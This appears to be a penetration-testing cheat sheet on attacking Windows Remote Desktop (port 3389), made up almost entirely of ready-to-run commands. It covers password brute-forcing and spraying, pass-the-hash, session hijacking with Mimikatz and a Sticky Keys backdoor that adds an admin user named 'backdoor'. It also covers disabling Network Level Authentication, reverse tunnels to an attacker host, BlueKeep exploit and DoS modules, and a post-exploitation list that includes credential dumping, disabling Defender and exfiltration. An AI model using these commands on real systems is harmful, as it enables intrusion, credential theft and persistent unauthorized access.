# RDP ENUMERATION (Port 3389)

## PORT OVERVIEW
```
Port 3389 - RDP (Remote Desktop Protocol)
Port 3388 - Alternative RDP port (less common)
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p3389 <IP>                            # Service/Version detection
nmap -p3389 --script rdp-enum-encryption <IP>   # Encryption level
nmap -p3389 --script rdp-ntlm-info <IP>         # Extract domain/hostname via NTLM
nc -nv <IP> 3389                                # Manual banner grab
```

## NMAP RDP ENUMERATION
```bash
nmap --script "rdp-*" -p3389 <IP>               # All RDP scripts
nmap --script rdp-enum-encryption -p3389 <IP>   # Supported encryption
nmap --script rdp-ntlm-info -p3389 <IP>         # NTLM info (domain, hostname, version)
nmap --script rdp-vuln-ms12-020 -p3389 <IP>     # MS12-020 (BlueKeep predecessor)
```

## NTLM INFORMATION DISCLOSURE
```bash
# Extract Windows domain information via RDP
nmap -p3389 --script rdp-ntlm-info <IP>         # Get domain, hostname, OS version

# Returns:
# - NetBIOS computer name
# - NetBIOS domain name
# - DNS computer name
# - DNS domain name
# - OS version
# - No authentication required!
```

## RDP CONNECTION TESTING
```bash
# xfreerdp (Linux RDP client)
xfreerdp /v:<IP> /u:<USER> /p:<PASSWORD>        # Basic connection
xfreerdp /v:<IP> /u:<USER> /p:<PASSWORD> /cert-ignore  # Ignore cert warnings
xfreerdp /v:<IP> /u:<DOMAIN>\<USER> /p:<PASSWORD>  # Domain authentication
xfreerdp /v:<IP> /u:<USER> /pth:<NTLM_HASH>     # Pass-the-hash
xfreerdp /v:<IP> /u:<USER> /p:<PASSWORD> /size:1920x1080  # Custom resolution
xfreerdp /v:<IP> /u:<USER> /p:<PASSWORD> /dynamic-resolution  # Dynamic resize
xfreerdp /v:<IP> /u:<USER> /p:<PASSWORD> +clipboard  # Enable clipboard
xfreerdp /v:<IP> /u:<USER> /p:<PASSWORD> /drive:share,/tmp  # Share local folder

# rdesktop (alternative Linux RDP client)
rdesktop -u <USER> -p <PASSWORD> <IP>           # Basic connection
rdesktop -u <DOMAIN>\\<USER> -p <PASSWORD> <IP> # Domain auth
rdesktop -u <USER> -p <PASSWORD> -g 1920x1080 <IP>  # Custom resolution
```

## RDP BRUTE FORCE
```bash
# Hydra
hydra -l administrator -P rockyou.txt rdp://<IP>  # Single user
hydra -L users.txt -P passwords.txt rdp://<IP>  # User/pass lists
hydra -l administrator -P passwords.txt -s 3389 rdp://<IP> -t 1  # Slow, avoid lockout

# CrackMapExec
crackmapexec rdp <IP> -u administrator -p passwords.txt  # Single user
crackmapexec rdp <IP> -u users.txt -p passwords.txt  # Multiple users
crackmapexec rdp <IP> -u users.txt -p 'Password123!' --continue-on-success

# Crowbar (specifically for RDP)
crowbar -b rdp -s <IP>/32 -u administrator -C passwords.txt  # Brute force
crowbar -b rdp -s <IP>/32 -U users.txt -C passwords.txt  # Multiple users

# Ncrack
ncrack -vv --user administrator -P passwords.txt rdp://<IP>  # Brute force
ncrack -vv -U users.txt -P passwords.txt rdp://<IP>  # User/pass lists
```

## RDP PASSWORD SPRAY
```bash
# Slow spray to avoid lockout
crackmapexec rdp <IP> -u users.txt -p 'Winter2024!' --continue-on-success

# Custom script (slow spray)
for user in $(cat users.txt); do
  echo "[*] Testing: $user"
  xfreerdp /v:<IP> /u:$user /p:'Password123!' /cert-ignore 2>&1 | grep -i "Authentication"
  sleep 5  # Delay to avoid lockout
done
```

## PASS-THE-HASH (PTH) VIA RDP
```bash
# Restricted Admin mode must be enabled on target
# Registry: HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin = 0

# xfreerdp with hash
xfreerdp /v:<IP> /u:<USER> /pth:<NTLM_HASH> /cert-ignore

# Enable Restricted Admin mode remotely (if admin)
crackmapexec smb <IP> -u administrator -p password -M rdp -o ACTION=enable
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

## RDP VULNERABILITIES
```bash
# BlueKeep (CVE-2019-0708)
# Critical RCE vulnerability, affects Windows 7, Server 2008
nmap --script rdp-vuln-ms12-020 -p3389 <IP>     # Detection (older vuln)
# No public Nmap script for BlueKeep, use Metasploit

# MS12-020 (CVE-2012-0002)
# DoS vulnerability, can crash RDP service
nmap --script rdp-vuln-ms12-020 -p3389 <IP>

# Metasploit modules
msfconsole
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep  # BlueKeep scanner
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce  # BlueKeep exploit (unreliable)
use auxiliary/dos/windows/rdp/ms12_020_maxchannelids  # MS12-020 DoS
```

## SESSION HIJACKING
```bash
# If admin access to target, hijack active RDP session
# Requires SYSTEM privileges

# List active sessions
query user                                      # On Windows target
qwinsta                                         # Alternative command

# Hijack session (as SYSTEM)
tscon <SESSION_ID> /dest:<CURRENT_SESSION>      # Redirect session to your console

# Using Mimikatz
mimikatz.exe "privilege::debug" "ts::sessions"  # List sessions
mimikatz.exe "privilege::debug" "ts::remote /id:<SESSION_ID>"  # Hijack session
```

## STICKY KEYS BACKDOOR
```bash
# Replace sethc.exe (Sticky Keys) with cmd.exe
# Allows backdoor access before login

# On target (requires write access to C:\Windows\System32)
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe  # Backup first!
takeown /F C:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant administrators:F
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe

# Access backdoor
# Press SHIFT 5 times at RDP login screen → cmd.exe as SYSTEM
# Create new admin user: net user backdoor Password123! /add && net localgroup administrators backdoor /add
```

## RDP TUNNELING & PORT FORWARDING
```bash
# SSH tunnel to access RDP
ssh -L 3389:target:3389 user@jumphost          # Forward local 3389 to target
xfreerdp /v:localhost /u:administrator /p:password  # Connect to localhost

# Reverse RDP tunnel (from compromised target)
# On attacker:
ssh -R 3389:localhost:3389 attacker@<attacker_IP>  # Reverse tunnel

# On attacker:
xfreerdp /v:localhost /u:administrator /p:password  # Connect via tunnel

# Chisel (cross-platform tunnel)
# On attacker:
chisel server -p 8080 --reverse
# On target:
chisel client <attacker_IP>:8080 R:3389:localhost:3389
```

## CRACKMAPEXEC RDP MODULES
```bash
# Enumerate RDP status
crackmapexec rdp <IP>                           # Check if RDP is accessible

# Enable RDP remotely (requires admin on SMB)
crackmapexec smb <IP> -u administrator -p password -M rdp -o ACTION=enable

# Disable NLA (Network Level Authentication) - makes RDP easier to attack
crackmapexec smb <IP> -u administrator -p password -M rdp -o ACTION=disable_nla

# RDP login test
crackmapexec rdp <IP> -u administrator -p password
crackmapexec rdp <IP> -u users.txt -p passwords.txt --continue-on-success
```

## NETWORK LEVEL AUTHENTICATION (NLA)
```bash
# NLA requires authentication before establishing RDP session
# Enabled by default on modern Windows

# Check if NLA is enabled
nmap -p3389 --script rdp-enum-encryption <IP> | grep "NLA"

# Disable NLA remotely (requires admin)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f
```

## ENABLE RDP REMOTELY
```bash
# Via SMB/WMI/RPC with admin credentials

# Enable RDP via registry
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Enable RDP firewall rule
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# Via CrackMapExec
crackmapexec smb <IP> -u administrator -p password -M rdp -o ACTION=enable

# Via WMI (Impacket)
impacket-wmiexec administrator:password@<IP> 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
```

## RDP ENCRYPTION LEVELS
```bash
# Check encryption level
nmap -p3389 --script rdp-enum-encryption <IP>

# Encryption levels:
# - None (no encryption) - very insecure
# - Low (56-bit) - weak
# - Client Compatible - negotiated
# - High (128-bit) - secure
# - FIPS Compliant - strongest
```

## RDP LOGGING & ARTIFACTS
```bash
# RDP logs location (on Windows target)
# Event Viewer → Windows Logs → Security
# Event IDs:
# 4624 - Successful logon (Logon Type 10 = RDP)
# 4625 - Failed logon
# 4778 - Session reconnected
# 4779 - Session disconnected

# Check RDP logs via PowerShell
Get-EventLog -LogName Security -InstanceId 4624 | Where-Object { $_.Message -like "*Logon Type: 10*" }

# RDP connection cache (on client)
# C:\Users\<USER>\AppData\Local\Microsoft\Terminal Server Client\Cache\
# Contains bitmap cache of RDP sessions
```

## XFREERDP ADVANCED OPTIONS
```bash
# Full feature connection
xfreerdp /v:<IP> /u:<USER> /p:<PASSWORD> \
  /cert-ignore \
  /size:1920x1080 \
  /dynamic-resolution \
  +clipboard \
  +drives \
  /drive:share,/tmp \
  /audio-mode:0 \
  /video \
  /network:auto \
  /gfx:rfx

# Stealth options
xfreerdp /v:<IP> /u:<USER> /p:<PASSWORD> /cert-ignore -wallpaper -themes -aero

# Performance options
xfreerdp /v:<IP> /u:<USER> /p:<PASSWORD> /cert-ignore /compression /network:lan

# Multi-monitor
xfreerdp /v:<IP> /u:<USER> /p:<PASSWORD> /cert-ignore /multimon
```

## RDPWRAP (CONCURRENT SESSIONS)
```bash
# RDP Wrapper allows multiple concurrent RDP sessions on Windows Home/Pro
# Normally only Windows Server allows multiple sessions

# Install RDPWrap (on target)
# Downloads from: https://github.com/stascorp/rdpwrap
# Bypasses single-session limit
```

## METASPLOIT RDP MODULES
```bash
msfconsole
use auxiliary/scanner/rdp/rdp_scanner          # Detect RDP
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep  # BlueKeep scanner
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce  # BlueKeep exploit
use auxiliary/dos/windows/rdp/ms12_020_maxchannelids  # MS12-020 DoS
use post/windows/manage/enable_rdp             # Enable RDP post-exploitation
```

## COMMON DEFAULT CREDENTIALS
```
administrator:password
administrator:admin
administrator:Password1
administrator:P@ssw0rd
admin:admin
guest:guest (usually disabled)
```

## RDP OVER HTTP/HTTPS (RD Gateway)
```bash
# RD Gateway allows RDP over HTTP/HTTPS (Port 443)
# Used to access internal RDP servers from internet

# Detect RD Gateway
nmap -p443 --script http-title <IP> | grep -i "remote desktop"

# Connect via RD Gateway
xfreerdp /v:<internal_IP> /u:<USER> /p:<PASSWORD> /g:<gateway_IP> /gu:<gw_user> /gp:<gw_pass>
```

## COMMON MISCONFIGURATIONS
```
☐ RDP exposed to internet (port 3389 publicly accessible)
☐ Weak/default passwords
☐ Administrator account enabled with RDP access
☐ No account lockout policy (allows brute force)
☐ NLA disabled (easier to attack)
☐ Outdated Windows version (BlueKeep, MS12-020)
☐ Restricted Admin mode enabled (allows PTH)
☐ No MFA/2FA on RDP
☐ No IP whitelisting/firewall rules
☐ Sticky Keys backdoor present
```

## QUICK WIN CHECKLIST
```
☐ Check if RDP is publicly accessible
☐ Extract domain/hostname via NTLM info
☐ Test default credentials (administrator:password)
☐ Check for BlueKeep (CVE-2019-0708)
☐ Check for MS12-020 (CVE-2012-0002)
☐ Test for weak passwords (password spray)
☐ Check if NLA is disabled
☐ Test for Restricted Admin mode (PTH possible)
☐ Look for Sticky Keys backdoor
☐ Check if RDP is enabled on target (might need enabling)
```

## ONE-LINER FULL ENUMERATION
```bash
# Quick RDP enumeration
nmap -sV -p3389 --script rdp-ntlm-info,rdp-enum-encryption,rdp-vuln-ms12-020 <IP>

# Full scan with brute force
nmap -sV -p3389 --script "rdp-*" <IP> && \
crackmapexec rdp <IP> -u administrator -p passwords.txt
```

## ADVANCED TECHNIQUES
```bash
# RDP Man-in-the-Middle
# Intercept RDP credentials
# Requires MITM position on network
# Tools: Cain & Abel, Ettercap, bettercap

# RDP session recording
# Record RDP sessions for later analysis
# Tools: PyRDP, Seth

# RDP honeypot
# Deploy fake RDP service to capture credentials
# Tools: RDPy
```

## POST-EXPLOITATION (AFTER RDP ACCESS)
```bash
# After gaining RDP access:
1. Enumerate local system (whoami, systeminfo, ipconfig)
2. Check privileges (whoami /priv, whoami /groups)
3. Dump credentials (mimikatz, procdump lsass)
4. Search for sensitive files (documents, configs, passwords)
5. Enumerate network (net view, arp -a, ipconfig /all)
6. Lateral movement (use found credentials on other systems)
7. Persistence (create user, scheduled task, startup)
8. Disable Windows Defender (if admin)
9. Exfiltrate data
10. Pivot to other systems (port forwarding, proxychains)

# Create backdoor user via RDP
net user backdoor Password123! /add
net localgroup administrators backdoor /add
net localgroup "Remote Desktop Users" backdoor /add
```

## RDP ALTERNATIVES & RELATED PROTOCOLS
```
Port 5985/5986 - WinRM (Windows Remote Management)
Port 22 - SSH (if OpenSSH is installed on Windows)
Port 5900 - VNC (alternative remote desktop)
Port 443 - RD Gateway (RDP over HTTPS)
```
